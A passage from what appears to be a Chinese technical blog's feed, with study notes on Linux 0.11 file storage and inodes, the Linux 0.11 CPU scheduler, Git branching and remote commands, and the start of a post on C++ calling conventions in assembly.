生磁盘</strong> 。也就是还不够符合用户的直观想法。</p><p>从而有了第三层抽象——<strong>文件</strong>，从此叫做 <strong>Cookied Disk</strong> </p><p>在用户眼里，文件就是一串字符流，比如一个源文件<code>test.c</code>。但是在磁盘的角度来看，文件就是一个个盘块。所以，操作系统的工作就是将用户对字符流的修改映射到对盘块的修改。从这点来看，操作系统真的是衔接软件和硬件的桥梁，<strong>磁盘只负责存储数据，但是将数据存储在什么地方，以什么样的方式存储，这就不是它要操心的了，这是操作系统的工作。</strong></p><p>那么操作系统该如何维护这种映射，以及如何存储数据呢？</p><p>最直接的想法是将文件按顺序在磁盘中一块一块连续存储。这样只需要在<code>test.c</code>的<code>FCB（文件控制块）</code>中存储该文件的文件名，起始块和块数就行了。这样的话，只需要计算出要修改的字符在字符流中的位置然后取余一定的数值就可以计算出相应的逻辑盘块号，然后加上起始块就行。</p><p>比如说，我要修改<code>test.c</code>文件的200-212行，而每100行就占据一个盘块。这样可以计算出200行的逻辑盘块号为 200 % 100 &#x3D; 2，再加上该文件的物理起始块号比如 6，就可以得出 200 行所在的物理盘块号为 6+2 &#x3D; 8，最后把我们计算出的盘块放到上面讲的<strong>申请队列</strong>就可以了。</p><p>这样的<strong>连续存储</strong>的方式很方便，缺点也很明显，不利于文件的缩减和扩增，因为这会挤到旁边的文件。</p><p>既然数组的方式不行，于是有了链表的方式。</p><p>就跟传统链表，在每个盘块号的结尾放上指向下一个盘快号的指针就行。<code>FCB</code>只需要记录起始块号就可以按着链表慢慢找下去了。优点很明显，利于盘块的插入和删除。但是缺点就是每次查找的时间复杂度为 <code>O(n)</code></p><p>最终想出来的就是<strong>索引结构</strong>，结合了数组和链表。<code>inode</code>的<code>i</code>就是索引<code>index </code>的意思，而<code>node</code>指代的就是<code>FCB</code>。</p><p>具体是什么意思呢。管理一个文件，首先有一个总的<strong>管理盘块</strong>，这个管理盘块叫做<strong>索引块</strong>，其实就是一个索引表，它就像一个数组一样，记录下每个逻辑盘块号所指向的物理盘块号。然后<code>FCB</code>只需要存储文件的索引块就可以通过索引块中的指向找到想要的逻辑盘块对应的物理盘块。</p><p>其实对磁盘的存储管理可以借鉴像内存管理的多级页表那样，在磁盘中建立<strong>多级索引</strong>。</p><p>对于小文件，可以直接从索引块中找到对应的物理块。</p><p>对于中文件，可以使用一级索引表。</p><p>对于大文件，可以使用二级索引。</p><p>以文件的的形式使用磁盘又是如何实现的</p><p>首先先来看一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linux0.11/fs/read_wirte.c */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sys_write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">char</span>* buf, <span class="type">int</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span>* <span class="title">file</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span>* <span class="title">inode</span>;</span></span><br><span class="line">    file = current-&gt;filp[fd];</span><br><span class="line">    inode = file-&gt;inode;</span><br><span class="line">    <span class="keyword">if</span> (S_ISREG(inode-&gt;i_mode))</span><br><span class="line">        <span class="keyword">return</span> file_write(inode, file, buf, count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用户通过系统调用函数<code>write</code>进入这个函数，然后开启磁盘的读写。</p><p>从这里看出，用户只需要提供<code>文件描述符</code>、<code>缓冲区内存地址</code>、<code>要读写的字节数</code></p><p>然后<code>sys_write()</code>会根据文件描述符，从<code>filp</code>中获取到文件指针<code>file</code>，再通过文件指针获取到<code>inode</code>，也就是<code>FCB</code>。最后一并传给<code>file_write()</code>函数</p><p>有了要读写的缓冲区，和要读写的大小，但是具体是文件的哪个位置呢。这个信息存储在<code>file</code>中的<strong>读写指针</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">off_t</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> f_mode;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> f_flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> f_count;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">f_inode</span>;</span></span><br><span class="line"><span class="type">off_t</span> f_pos; <span class="comment">/* 读写指针 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们可以把一个文件看作一个有头没有尾的<strong>字节数组</strong>，对文件的修改就是对这个字节数组修改，而这个<code>f_pos</code>读写指针就是这个数组的索引，指向哪就从哪里开始修改。刚开始<code>file</code>被创建时，<code>f_pos</code>会被初始化为0。</p><p><code>inode</code>结构中的<code>i_zone[]</code>就是逻辑块号到物理块好的映射。其中</p><p><code>i_zone[0-6]</code>是直接表示逻辑块号到物理块号的映射</p><p><code>i_zone[7]</code>是一级索引表</p><p><code>i_zone[8]</code>是二级索引表</p><p>由此可以看出，对于<code>Linux0.11</code>存储的文件所占据的磁盘最大为 <code>7 + 512 + 512*512 = 262663</code>个盘块，也就是<code>262663KB = 256MB</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【哈工大操作系统】CPU调度策略</title>
      <link href="/2024/05/01/%E3%80%90%E5%93%88%E5%B7%A5%E5%A4%A7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%91CPU%E8%B0%83%E5%BA%A6%E7%AD%96%E7%95%A5/"/>
      <url>/2024/05/01/%E3%80%90%E5%93%88%E5%B7%A5%E5%A4%A7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%91CPU%E8%B0%83%E5%BA%A6%E7%AD%96%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="如何让进程满意？"><a href="#如何让进程满意？" class="headerlink" title="如何让进程满意？"></a>如何让进程满意？</h3><ul><li>尽快结束任务：周转时间（从任务进入到任务结束）短</li><li>用户操作尽快响应：响应时间（从操作发生到响应）短</li><li>系统内耗时间短：吞吐量（完成的任务量）大</li></ul><p>讲4个算法，重点是后面3个算法</p><ol><li><code>First Come,First Served(FCFS)</code>，先到先得算法，比较公平，但是不切实际，差不多意思一下</li><li><code>SJF</code>，短作业优先算法，让<code>CPU区间</code>短或者说执行时间短的作业优先执行，这样子可以达到整体的平均的周转时间最短(任务的周转时间是从任务提交时开始计时，因为是多个任务同时提交，所以从第一个任务开始执行时开始计时)。为什么可以使周转时间最短，可以大致这么想，周转时间体现的是<strong>总体进程的满意度</strong>，在相同时间内，执行的进程越多，那么总体的满意度也就越高了。用公式证明一下<br>  假设最后的调度结果序列为 {p1, p2, p3, …, p<del>n</del>}，那么 p1的周转时间为 p1; p2的周转时间为 p1+p2，p3 的周转时间为 p1+p2+p3 ; 最终 p<del>n</del> 的周转时间为 p1+p2+p3+…+pn<br>  由此得出平均周转时间为<br>  $$(p1)+(p1+p2)+(p1+p2+p3)+… &#x3D; \sum (n+1-i)p_i $$<br>  可以发现越靠前的任务在公式中出现的次数越多，所以只要执行时间短的任务尽量往前靠，优  先执行，就能达成平均周转时间最短 </li><li><code>Round Robin(RR)</code>，<strong>时间片</strong>轮转调度算法，这样的算法可以实现并发，只要控制好时间片的大小，和进程的数量，那么一个进程的最大响应时间就是<code>(n-1) * T</code>，就可以控制响应时间了。可以满足受IO控制的前台任务对响应时间的需求</li><li>设置优先级，让前台任务实现<code>RR</code>算法，后台任务实现<code>SJF</code>算法。前台任务的优先级高于后台任务，<br>  但是弊端十分明显，后台任务可能永远会不执行</li></ol><p>我们最终的目的就是结合上面最后3个算法</p><ol><li><strong>轮转调度</strong>为核心，让CPU可以在前台任务和后台任务之间也可跳转，</li><li>让前台任务有需要的时候能够优先执行前台任务。这里就需要设置一下优先级</li><li>让后台任务能够实现短作业优先，实现平均周转时间最短</li></ol><p>在<code>linux-0.11/kernel/sched.c</code>给出了一个调度算法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_RUNNING 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_INTERRUPTIBLE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_UNINTERRUPTIBLE 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_ZOMBIE 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_STOPPED 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_TASK task[0]</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_TASK task[NR_TASKS-1]</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">schedule</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i,next,c;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> ** <span class="title">p</span>;</span> <span class="comment">// p 是一个指向任务结构指针的指针</span></span><br><span class="line">       <span class="comment">// 因为下面涉及的任务数组中的元素是任务结构指针</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check alarm, wake up any interruptible tasks that have got a signal */</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">/* this is the scheduler proper: */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">c = <span class="number">-1</span>; <span class="comment">// c接下来被定义为counter的最大值</span></span><br><span class="line">next = <span class="number">0</span>;</span><br><span class="line">i = NR_TASKS; <span class="comment">// NUMBER_TASKS,任务总数</span></span><br><span class="line">p = &amp;task[NR_TASKS]; <span class="comment">// 数组最后一个元素再后一个位置</span></span><br><span class="line"><span class="keyword">while</span> (--i) &#123; <span class="comment">// 开从后往前遍历</span></span><br><span class="line"><span class="keyword">if</span> (!(*(--p))) <span class="comment">// 如果这个数组中的元素指向的是NULL</span></span><br><span class="line"><span class="keyword">continue</span>; <span class="comment">// 就跳过这个任务</span></span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;state == TASK_RUNNING &amp;&amp; (*p)-&gt;counter &gt; c) &#123;</span><br><span class="line">                <span class="comment">/* 如果任务是就绪态并且该任务的时间片比c大的话 */</span></span><br><span class="line">                c = (*p)-&gt;counter, next = i;</span><br><span class="line">                <span class="comment">/* 就把下一个要调度的任务设置为该任务 */</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (c) <span class="keyword">break</span>; <span class="comment">// 如果 c &gt; 0 的话就确定要调度的任务</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* 如果 c == 0 说明所有就绪态任务的时间片都用完了</span></span><br><span class="line"><span class="comment">           这时就需要重新分配一下时间片</span></span><br><span class="line"><span class="comment">           其中task[0]是系统的init进程，</span></span><br><span class="line"><span class="comment">           这个进程需要在开机时运行一次就好了</span></span><br><span class="line"><span class="comment">           后续的调度不需要考虑它</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"><span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p)</span><br><span class="line"><span class="keyword">if</span> (*p) &#123;</span><br><span class="line">                (*p)-&gt;counter = ((*p)-&gt;counter &gt;&gt; <span class="number">1</span>) + (*p)-&gt;priority;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">switch_to(next);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*p) &#123; <span class="comment">// 如果*p不指向NULL的话</span></span><br><span class="line">         (*p)-&gt;counter = ((*p)-&gt;counter &gt;&gt; <span class="number">1</span>) + (*p)-&gt;priority;</span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码需要单独拎出来讲，</p><p>首先，<code>counter</code>的设计满足了上面提到的第1点，前台任务和后台任务不再有特别区分，它们之间可以用时间片来实现轮转调度，同时还根据<code>counter</code>的大小来判断优先级</p><p>其次，<code>counter = counter / 2 + priority</code>的设计，让时间片的大小得到不断增加，但是有一个阈值。没错，这涉及到一个收敛的数列。<br>$$<br>C_{0}&#x3D;P\由上述代码得出递推公式:\C_{n}&#x3D;\frac{C_{n-1}}{2}+P\变形一下，得C_{n}-2P&#x3D;\frac{1}{2}(C_{n-1}-2P)\得出一个等比数列\令a_{n}&#x3D;C_{n}-2P\则 a_{0}&#x3D;C_{0}-2P&#x3D;-P\\therefore C_{n}-2P&#x3D;a_{n}&#x3D;-\frac{P}{2^{n}}\\therefore C_{n}&#x3D;2P-\frac{P}{2^{n}}<br>$$</p><p>这样的设计不仅保证了前台任务(IO进程)要求的响应时间，同时因为前面就绪态所有的时间片都为0了，这个算法使阻塞进程的<code>counter</code>不断变大，阻塞态经历的时间越久，<code>counter</code>就会越大，优先级也就越高，由此当进程从阻塞态回来时，就可以优先执行它了，满足了上面的第2个条件</p><p>至于第3个条件，我觉得应该是使用<code>priority</code>来决定的，执行时间短的任务自然<code>priority</code>大就行了</p><p><code>counter</code>的设计承担时间片的作用，不仅满足了轮转调度，还满足了优先级的需求</p>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git学习</title>
      <link href="/2024/04/21/Git%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/04/21/Git%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="关联本地仓库和远程仓库并进行push"><a href="#关联本地仓库和远程仓库并进行push" class="headerlink" title="关联本地仓库和远程仓库并进行push"></a>关联本地仓库和远程仓库并进行push</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git remote add &lt;reposiotry-name&gt; &lt;url&gt;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;reposiotry-name&gt;是自定义的一个远程仓库nickname</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git push &lt;remote-repository&gt; &lt;local-branch&gt;:&lt;remote:branch&gt;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;remote-repository&gt;用名字或者url都行</span></span><br></pre></td></tr></table></figure><h2 id="克隆刚刚push的仓库修改后再push"><a href="#克隆刚刚push的仓库修改后再push" class="headerlink" title="克隆刚刚push的仓库修改后再push"></a>克隆刚刚push的仓库修改后再push</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone &lt;remote-repository-url&gt; &lt;target-directory&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修改其中的sample.txt文件</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git push</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">因为是<span class="built_in">clone</span>的,在.git中保留了远程仓库的相关信息</span></span><br></pre></td></tr></table></figure><p><code>git diff</code>，比较工作区和暂存区的文件之间的差异。</p><p>以暂存区的文件作为参照物来描述工作区的文件的差异。</p><p>同理<code>git diff --staged</code>，比较暂存区和存储区的差异，以存储区作为参照物</p><p>在<code>Git</code>中，代码的管理围绕<strong>提交记录</strong>进行</p><p>提交记录就是一个<strong>提交对象</strong>，提交对象包含了很多信息，比如<code>提交时的注释</code>、<code>指向上一个提交对象的指针</code>、<code>指向树对象的指针</code>。</p><p><strong>项目结构树对象</strong>，其上的根节点和分支节点其实就是目录或者说文件夹。而其叶子节点指向实际的文件对象，文件对象实际上就是<code>blob</code>对象</p><p><strong>blob对象</strong>，就是实际的文件对象</p><p>项目结构树对象和若干个blob对象就组成了一次提交时产生的暂存内容的<strong>快照</strong>，提交对象虽然说实际上指向的是树对象，但也可以说指向的是这次提交产生的快照</p><p><strong>分支</strong>，就是一个指针，这个指针指向提交对象，比如说<code>master</code>，本质就是一个指针，通常情况下指向最新的一次提交对象。因为分支实际是指针，所以在<code>Git</code>中，称分支为<code>ref</code>，引用</p><p><strong>HEAD</strong>，也是一个指针，这个指针可以指向分支，也可以指向提交对象</p><p>特别需要说明的是，比如说<code>HEAD^</code>，通常说是上一个节点，但是<code>HEAD</code>哪来的上一个节点？假设这时的情况是<code>HEAD-&gt;master-&gt;commit1</code>，<code>commit1</code>是有上一个节点的，所以这个过程是从<code>HEAD</code>递归寻找到其最终指向的一个提交对象，然后然后得出该提交对象的上一个提交对象，即<code>commit0</code>。这有点像运算符重载。同理<code>master^</code>也是一样。<code>ref^</code>与<code>ref~n</code>运算的结果都是提交对象</p><p><code>git checkout &lt;ref&gt;/&lt;commit&gt;</code>命令，用来修改<code>HEAD</code>的指向，后面跟一个分支名或者一个提交对象。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git checkout main # 让HEAD指向分支main</span><br><span class="line">git checkout &lt;commit&gt; # 让HEAD指向某次提交</span><br></pre></td></tr></table></figure><p><code>git branch -f &lt;ref1&gt; &lt;commit&gt;/&lt;ref2&gt;/HEAD</code>命令，改变分支<code>ref1</code>的指向，后面跟一个提交对象或者另一个分支。注意分支最终指向的一定是提交对象，所以这里第二个参数为分支或<code>HEAD</code>也有点递归的意思。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git branch -f main &lt;commit&gt; # 让分支main指向某次提交</span><br><span class="line">git branch -f main master # 让分支main指向分支master指向的提交</span><br><span class="line">git branch -f main HEAD # 让分支main指向HEAD最终指向的提交</span><br></pre></td></tr></table></figure><p><code>git reset &lt;commit&gt;/&lt;ref&gt;</code>命令，这个命令是修改当前<code>HEAD</code>所指向的分支的指向，但是<code>HEAD</code>的指向仍然是刚才的分支不会变。比如此时<code>HEAD-&gt;main-&gt;c1</code>，用了这个命令后<code>HEAD-&gt;main-&gt;c0</code>，也有点递归的意思</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset master # 假如此前HEAD-&gt;main-&gt;c1，master-&gt;c0; 此后HEAD-&gt;main-&gt;c0</span><br></pre></td></tr></table></figure><p><code>git cherry-pick &lt;commit&gt;/&lt;ref&gt;</code>命令，复制其它分支上的提交对象，commit 到当前<code>HEAD</code>所指向的分支，比如此时<code>HEAD-&gt;main-&gt;c1</code>,<code>master-&gt;c2</code>，使用命令后<code>HEAD-&gt;main-&gt;c2-&gt;c1&#39;</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">HEAD-&gt;main-&gt;&lt;commit&gt;</span></span><br><span class="line">git cherry-pick &lt;commit&gt;</span><br><span class="line">git cherry-pick master</span><br><span class="line">git cherry-pick master^</span><br></pre></td></tr></table></figure><p><code>git rebase &lt;ref&gt;</code>命令，修改当前<code>HEAD</code>所指向的分支的基。<code>Git</code>会找到当前分支与参数中<code>ref</code>分支的第一个公共祖先节点，然后把当前分支指向的节点之前的提交对象做一个拷贝，把拷贝的对象都移到<code>ref</code>指向的提交对象的后面，最后修改当前分支的指向到最后一个拷贝对象上，注意<code>HEAD</code>的指向的还是当前分支不变，由此实现变基。加了<code>-i或者--iteractive</code>还可以打开交互式GUI界面，改变当前分支指向的节点到公共祖先节点之间的节点的顺序，或者删除节点</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">HEAD-&gt;main-&gt;c4-&gt;c3-&gt;c1，master-&gt;c2-&gt;c1</span></span><br><span class="line">git rebase master # 此后HEAD-&gt;main-&gt;c4&#x27;-&gt;c3&#x27;-&gt;c2-&gt;c1, master-&gt;c2-&gt;c1, c4-&gt;c3-&gt;c1</span><br></pre></td></tr></table></figure><p><code>git rebase &lt;ref1&gt; &lt;ref2&gt;</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rebase &lt;ref1&gt; &lt;ref2&gt; # 把&lt;ref2&gt;分支变基到&lt;ref1&gt;分支上</span><br></pre></td></tr></table></figure><p><code>git commit --amend</code>命令，只会再次提交一次当前<code>HEAD</code>指向的提交对象，然后修改分支指向，不会影响后面子提交的父指向</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">c3-&gt;c2-&gt;c1. HEAD-&gt;main-&gt;c2-&gt;c1</span></span><br><span class="line">git commit --amend # c3-&gt;c2-&gt;c1, HEAD-&gt;main-&gt;c2&#x27;-&gt;c1</span><br></pre></td></tr></table></figure><p><code>git describe &lt;commit&gt;/&lt;ref&gt;/HEAD</code>，描述离指定节点最近的一次有<code>tag</code>的节点</p><p><code>git checkout main; git meerge master</code>，合并的新节点属于<code>main</code>分支，也就是<code>HEAD-&gt;main-&gt;&lt;new-commit&gt;</code></p><p><code>git fetch</code> 完成了仅有的但是很重要的两步:</p><ul><li>从远程仓库下载本地仓库中缺失的提交记录</li><li>更新远程分支指针(如 <code>origin/main</code>)</li></ul><p><code>git fetch</code> 不会做的事</p><p><code>git fetch</code> 并不会改变你本地仓库的状态。它不会更新你的 <code>main</code> 分支，也不会修改你磁盘上的文件。</p><h2 id="先抓取更新再合并到本地分支"><a href="#先抓取更新再合并到本地分支" class="headerlink" title="先抓取更新再合并到本地分支"></a>先抓取更新再合并到本地分支</h2><p>这个流程指的是先<code>git fetch</code>，</p><p>再执行以下命令：</p><ul><li><code>git cherry-pick orign/main</code></li><li><code>git rebase orign/main</code></li><li><code>git merge orign/main</code></li><li>等等</li></ul><p>但是，<code>git pull</code>合并了这两步操作</p><p><code>git pull</code> 就是 <code>git fetch</code> 和 <code>git merge </code>的缩写！</p><p><code>git pull --rebase</code> 就是 <code>git fetch</code> 和 <code>git rebase</code> 的简写！</p><p><code>git push</code> 负责将<strong>你的</strong>变更上传到指定的远程仓库，并在远程仓库上<strong>合并</strong>你的新提交记录。</p><p><code>git push</code>默认会把当前<code>HEAD</code>指向的分支上的所有节点提交到远程仓库，在远程仓库修改或创建同名分支，在本地仓库修改或创建<code>origin/&lt;ref&gt;</code>远程分支以同步远程仓库</p><ul><li>pull 操作时, 提交记录会被先下载到 o&#x2F;main 上，之后再合并到本地的 main 分支。隐含的合并目标由这个关联确定的。</li><li>push 操作时, 我们把工作从 <code>main</code> 推到远程仓库中的 <code>main</code> 分支(同时会更新远程分支 <code>o/main</code>) 。这个推送的目的地也是由这种关联确定的！</li></ul><p>直接了当地讲，<code>main</code> 和 <code>o/main</code> 的关联关系就是由分支的“remote tracking”属性决定的。<code>main</code> 被设定为跟踪 <code>o/main</code> —— 这意味着为 <code>main</code> 分支指定了推送的目的地以及拉取后合并的目标。</p><p>当你克隆时, Git 会为远程仓库中的每个分支在本地仓库中创建一个远程分支（比如 <code>o/main</code>）。然后再创建一个跟踪远程仓库中活动分支的本地分支，默认情况下这个本地分支会被命名为 <code>main</code>。</p><p>这也解释了为什么会在克隆的时候会看到下面的输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">local branch &quot;main&quot; set to track remote branch &quot;o/main&quot;</span><br></pre></td></tr></table></figure><p>可以让任意分支跟踪 <code>o/main</code>, 然后该分支会像 <code>main</code> 分支一样得到隐含的 push 目的地以及 merge 的目标。 这意味着你可以在分支 <code>totallyNotMain</code> 上执行 <code>git push</code>，将工作推送到远程仓库的 <code>main</code> 分支上。</p><p>有两种方法设置这个属性，第一种就是通过远程分支切换到一个新的分支，执行:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b totallyNotMain o/main</span><br></pre></td></tr></table></figure><p>就可以创建一个名为 <code>totallyNotMain</code> 的分支，它跟踪远程分支 <code>o/main</code>。</p><p>另一种设置远程追踪分支的方法就是使用：<code>git branch -u</code> 命令，执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -u o/main foo</span><br></pre></td></tr></table></figure><p>这样 <code>foo</code> 就会跟踪 <code>o/main</code> 了。如果当前就在 foo 分支上, 还可以省略 foo：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -u o/main</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从汇编的角度理解C++的函数传参与函数返回</title>
      <link href="/2024/04/04/%E4%BB%8E%E6%B1%87%E7%BC%96%E7%9A%84%E8%A7%92%E5%BA%A6%E7%90%86%E8%A7%A3C++%E7%9A%84%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E4%B8%8E%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E/"/>
      <url>/2024/04/04/%E4%BB%8E%E6%B1%87%E7%BC%96%E7%9A%84%E8%A7%92%E5%BA%A6%E7%90%86%E8%A7%A3C++%E7%9A%84%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E4%B8%8E%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E/</url>
      
        <content type="html"><![CDATA[<p><img src="/../posts_img/%E4%BB%8E%E6%B1%87%E7%BC%96%E7%9A%84%E8%A7%92%E5%BA%A6%E7%90%86%E8%A7%A3C++%E7%9A%84%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E4%B8%8E%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E/00.png" alt="00"></p><p><img src="/../posts_img/%E4%BB%8E%E6%B1%87%E7%BC%96%E7%9A%84%E8%A7%92%E5%BA%A6%E7%90%86%E8%A7%A3C++%E7%9A%84%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E4%B8%8E%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E/01.png" alt="01"></p><p>这里呈现出一个简单的C++代码及其对应的汇编代码。用寄存器作为中间人，将数据从内存中一块区域移到另一块内存区域。当只有一个参数时，这里用的时<code>edi</code>寄存器</p><p>但是，寄存器的数量是有限的。当参数过多时又该如何传递呢</p><p>在当前的环境中，经过测试，当函数的参数达到 7 个即以上时，多出来参数将直接通过压栈的方式存储，对应的内存空间就是参数了</p><p><img src="/../posts_img/%E4%BB%8E%E6%B1%87%E7%BC%96%E7%9A%84%E8%A7%92%E5%BA%A6%E7%90%86%E8%A7%A3C++%E7%9A%84%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E4%B8%8E%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E/02.png" alt="02"></p><p><img 